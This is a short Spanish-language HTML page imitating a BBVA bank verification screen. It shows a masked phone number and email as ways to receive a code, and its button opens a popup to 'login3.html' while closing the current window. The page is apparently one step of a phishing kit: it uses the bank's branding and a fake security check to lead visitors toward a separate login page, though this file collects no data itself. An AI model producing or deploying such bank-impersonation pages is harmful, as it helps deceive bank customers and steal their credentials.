<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Verificación</title>

<style>

body{
margin:0;
font-family: Arial, Helvetica, sans-serif;
background:#efefef;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.container{
width:800px;
background:white;
border-radius:12px;
padding:40px;
box-shadow:0 10px 30px rgba(0,0,0,0.15);
}

.header{
text-align:center;
color:#072F8C;
}

.header h1{
margin:10px 0;
}

.content{
display:flex;
margin-top:40px;
gap:40px;
align-items:center;
}

.shield{
font-size:100px;
}

.options{
flex:1;
}

.option{
border:1px solid #ccc;
border-radius:8px;
padding:15px;
margin-bottom:15px;
display:flex;
align-items:center;
gap:10px;
}

button{
margin-top:20px;
background:#072F8C;
color:white;
border:none;
padding:12px 30px;
font-size:16px;
border-radius:6px;
cursor:pointer;
}

button:hover{
background:#0b3bb0;
}

</style>

<script>


function abrirLogin3(){

window.open(
"login3.html",
"validacion",
"width=1000,height=600"
);

window.close();

}

</script>

</head>

<body>

<div class="container">

<div class="header">
<h1>BBVA</h1>
<h2>¡Hola! Te damos la bienvenida a BBVA</h2>
</div>

<div class="content">

<div class="shield">🛡️</div>

<div class="options">

<h3>Estás accediendo a los sistemas de BBVA...</h3>

<p>Para tu tranquilidad, vamos a enviarte un código de verificación.</p>

<p><b>¿Cómo prefieres recibirlo?</b></p>

<div class="option">
<input type="radio" name="metodo">
******9108
</div>

<div class="option">
<input type="radio" name="metodo" checked>
ag***c@bbva.com 
</div>

<button onclick="abrirLogin3()">Enviar</button>

</div>

</div>

</div>

</body>
</html>
